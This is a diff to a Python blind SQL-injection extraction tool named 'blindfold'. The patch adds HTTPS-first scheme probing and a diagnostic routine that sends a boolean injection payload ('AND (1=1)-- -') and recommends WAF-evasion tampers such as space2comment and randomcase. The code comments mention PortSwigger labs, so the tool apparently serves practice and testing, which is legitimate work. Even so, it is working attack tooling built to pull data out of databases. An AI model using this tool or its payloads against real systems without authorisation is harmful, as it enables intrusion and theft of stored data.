@@ -384,8 +384,13 @@ def parse_request_file(path, proto):
             k, v = ln.split(":", 1)
             headers[k.strip()] = v.strip()
     host = headers.get("Host", "")
-    url = target if target.startswith("http") else f"{proto}://{host}{target}"
-    return method, url, headers, body.rstrip("\n")
+    if target.startswith("http"):
+        url, scheme_known = target, True
+    elif proto:                                  # scheme forced via --proto
+        url, scheme_known = f"{proto}://{host}{target}", True
+    else:                                        # no scheme anywhere -> probe later (https first)
+        url, scheme_known = f"https://{host}{target}", False
+    return method, url, headers, body.rstrip("\n"), scheme_known
 
 
 class Resp:
@@ -400,9 +405,10 @@ class Target:
         self.count = 0
         self._lock = threading.Lock()
         if a.request:
-            self.method, self.url, self.headers, self.data = parse_request_file(a.request, a.proto)
+            (self.method, self.url, self.headers, self.data,
+             self._scheme_known) = parse_request_file(a.request, a.proto)
         else:
-            self.url, self.data, self.headers = a.url, a.data, {}
+            self.url, self.data, self.headers, self._scheme_known = a.url, a.data, {}, True
             for h in (a.header or []):
                 if ":" not in h:
                     raise SystemExit(f"[!] bad header (expected 'Name: value'): {h!r}")
@@ -443,6 +449,20 @@ class Target:
             sd = (sum((x - mean) ** 2 for x in xs) / len(xs)) ** 0.5
             self._baseline = (med, sd)
         return self._baseline
+
+    def autodetect_scheme(self):
+        """A --request file carries no URL scheme. If none was forced with --proto,
+        try HTTPS first and fall back to HTTP only if the TLS endpoint is unreachable
+        (modern targets, and all PortSwigger labs, are HTTPS - plain HTTP to them was
+        silently 400ing every payload and looking like 'no injection')."""
+        if self._scheme_known or not self.url.startswith("https://"):
+            return
+        try:
+            self.send("")                             # clean baseline over https
+        except RequestError:
+            self.url = "http://" + self.url[len("https://"):]
+            print("[*] https unreachable - falling back to http")
+        self._scheme_known = True
 
     def _transform(self, p):
         for fn in self._tampers:                      # quote-aware SQL tampers
@@ -576,9 +596,6 @@ class TimeOracle(Oracle_):
 # ===========================================================================
 # Calibration (auto TRUE/FALSE signal for boolean)
 # ===========================================================================
-def _stable(vals, jitter):
-    return max(vals) - min(vals) <= jitter
-
 def _norm_tokens(text):
     # drop digit-only tokens so timestamps/counters don't poison token matching
     return {w for w in re.sub(r"\d+", "#", text).split() if len(w) >= 3}
@@ -1095,6 +1112,37 @@ def save_state(path, sig, length, value, count):
     os.replace(tmp, path)
 
 
+def diagnose(target, a):
+    """Detection failed. Compare a clean baseline against a representative injected
+    request so the failure mode is obvious instead of opaque: is the request itself
+    being rejected (wrong scheme/host/session), is only the *payload* rejected
+    (WAF / encoding), or is the response simply not changing?"""
+    print("\n[*] diagnostic: clean baseline vs an injected request ...")
+    try:
+        base = target.send("")
+        ctx = BOOL_CONTEXTS[0]                        # string-and: '...' AND (1=1)-- -
+        inj = target.send(boolean_payload(ctx, TRUE_COND, "-- -"))
+    except RequestError as e:
+        print(f"    [!] request transport failed: {e}")
+        return
+    print(f"    baseline : status={base.status} len={base.length}")
+    print(f"    injected : status={inj.status} len={inj.length}  ({ctx.name})")
+    if base.status < 400 <= inj.status:
+        print("    -> the INJECTED request is rejected (4xx/5xx) but the baseline is OK:")
+        print("       the payload isn't accepted. Try --no-encode and/or --tamper "
+              "space2comment,randomcase, or confirm the sink isn't URL-decoded.")
+    elif base.status >= 400:
+        print("    -> the BASE request is rejected even without injection:")
+        print("       check scheme (http vs https), Host, the session cookie, or marker placement.")
+    elif base.status == inj.status and base.length == inj.length:
+        print("    -> baseline and injected responses are identical:")
+        print("       the payload likely isn't landing (marker not in the query sink, or a "
+              "static page). Confirm the injection point and --marker.")
+    else:
+        print("    -> responses differ but no stable discriminator was found:")
+        print("       re-run with -v, or pin it with --true-match/--false-match.")
+
+
 def main():
     ap = argparse.ArgumentParser(
         description="blindfold - auto-detecting blind SQLi extractor (DBMS + error/boolean/time)")
@@ -1102,7 +1150,7 @@ def main():
     src.add_argument("-u", "--url"); src.add_argument("-d", "--data")
     src.add_argument("-H", "--header", action="append")
     src.add_argument("-X", "--method"); src.add_argument("--request")
-    src.add_argument("--proto", default="http")
+    src.add_argument("--proto", help="force scheme for --request (default: auto-probe https, then http)")
 
     act = ap.add_argument_group("action (default: map the database)")
     act.add_argument("--query", help="extract a single SQL scalar (power mode)")
@@ -1136,7 +1184,6 @@ def main():
     det.add_argument("--true-match", help="string only in a TRUE response (overrides calibration)")
     det.add_argument("--false-match", help="string only in a FALSE response")
     det.add_argument("--len-margin", type=int, default=12)
-    det.add_argument("--len-jitter", type=int, default=4)
 
     tun = ap.add_argument_group("tuning")
     tun.add_argument("--sleep", type=float, default=3.0)
@@ -1185,10 +1232,12 @@ def main():
     target = Target(a)
 
     print(BANNER)
+    target.autodetect_scheme()
     print("=== PHASE 1: detection ===")
     det = detect(target, a)
     if not det:
         print("\n[!] no blind injection detected.")
+        diagnose(target, a)
         print("    try --allow-or, --dbms, --force-time, --true-match, or check marker placement.")
         sys.exit(1)
     print(f"\n[+] DBMS      : {det.dbms.name}")
